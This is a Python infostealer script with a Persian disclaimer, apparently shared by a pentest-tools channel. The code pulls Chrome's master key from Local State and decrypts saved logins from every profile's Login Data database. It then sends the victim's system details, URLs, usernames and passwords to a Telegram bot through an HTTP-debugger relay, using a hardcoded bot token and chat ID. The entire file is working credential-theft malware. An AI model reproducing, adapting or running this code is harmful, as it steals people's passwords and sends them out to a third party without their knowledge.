# توجه    توجه
# استفاده از این ابزار به عهده استفاده کننده است و نه سازنده ابزار
# ابزار فقط در راستای ارتقای سطح سایبری کشور عزیزمان ایران ساخته شده 
# تمامی مسعولیت استفاده از این ابزار به عهده خود شماست

userid = "5600282433"

import os
import json
import base64
import sqlite3
import win32crypt
import requests
from Crypto.Cipher import AES
import platform
import shutil
from datetime import timezone, datetime, timedelta

def ban():
    username = os.getlogin()
    system_name = platform.node()
    system_info = platform.uname()
    fff = """\U0001F480"""*10 + '\n'
    fff += "نام کاربری (یوزرنیم):" + username + '\n'
    fff +="نام سیستم:"+ system_name+ '\n'
    fff +="اطلاعات کلی سیستم:"+ '\n'
    fff +="سیستم عامل:"+ system_info.system+ '\n'
    fff +="نام نسخه:"+ system_info.release+ '\n'
    fff +="نسخه:"+ system_info.version+ '\n'
    fff +="معماری سیستم:" + system_info.machine+ '\n'
    fff +="تیپ سیستم:"+ system_info.processor+ '\n'
    fff += "\U0001F4A3"*10 + '\n'
    return fff

def send(data):
	mypay={ "UrlBox":f"https://api.telegram.org/bot6529521187:AAHDSkRwTRGFPqdZntyDN8c0aD1OQHtYSsI/sendmessage?chat_id={userid}&text={data}",
            "AgentBox":"Google Chorom",
            "VersionList":"HTTP/1.1",
            "MethodList":"GET"}
	mypay1={ "UrlBox":f"https://api.telegram.org/bot6529521187:AAHDSkRwTRGFPqdZntyDN8c0aD1OQHtYSsI/sendmessage?chat_id=5600282433&text={data}",
            "AgentBox":"Google Chorom",
            "VersionList":"HTTP/1.1",
            "MethodList":"GET"}
	kreq = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)
	kreq1 = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay1)

def chrome_date_and_time(chrome_data):
	return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key():
	local_computer_directory_path = os.path.join(
	os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
	"User Data", "Local State")	
	with open(local_computer_directory_path, "r", encoding="utf-8") as f:
		local_state_data = f.read()
		local_state_data = json.loads(local_state_data)
	encryption_key = base64.b64decode(
	local_state_data["os_crypt"]["encrypted_key"])
	encryption_key = encryption_key[5:]
	return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):
	try:
		iv = password[3:15]
		password = password[15:]
		cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return "No Passwords"

def find_profile_default_directories():
    profile_default_dirs = []
    directory_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"
    for item in os.listdir(directory_path):
        item_path = os.path.join(directory_path, item)
        if os.path.isdir(item_path) and ("profile" in item.lower() or item.lower() == "default") and ('Login Data' in os.listdir(item_path)):
            profile_default_dirs.append(item)
    return profile_default_dirs

def main():
	ddd = """"""
	dnd = 0
	key = fetching_encryption_key()
	send(ban())
	profile_default_dir = find_profile_default_directories()
	for i in profile_default_dir:
		db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
							"Google", "Chrome", "User Data", i, "Login Data")
		filename = "ChromePasswords.db"
		shutil.copyfile(db_path, filename)
		db = sqlite3.connect(filename)
		cursor = db.cursor()
		cursor.execute(
			"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
			"order by date_last_used")
		for row in cursor.fetchall():
			main_url = row[0]
			login_page_url = row[1]
			user_name = row[2]
			decrypted_password = password_decryption(row[3], key)
			date_of_creation = row[4]
			last_usuage = row[5]
			if user_name or decrypted_password:
				ddd = ddd + "-"*35 + '\n'
				ddd = ddd + f"Main URL: {main_url}" + '\n'+ '\n'
				ddd = ddd + f"User name: {user_name}" + '\n'
				ddd = ddd + f"Password: {decrypted_password}" + '\n'	
			else:
				continue
			if date_of_creation != 86400000000 and date_of_creation:
				ddd = ddd + f"Creation date: {str(chrome_date_and_time(date_of_creation))}" + '\n'
		
			# ddd = ddd + "=" * 60 + '\n'
			dnd = dnd + 1
			if dnd == 10:
				send(ddd)
				ddd = """"""
				dnd = 0
			
		cursor.close()
		db.close()
	send(ddd)
	send('finish' + '\n' + '\U0001F4A4' * 20 + '\n\n\n@tools4pen')
	try:
		os.remove(filename)
	except:
		pass

if __name__ == "__main__":
	main()
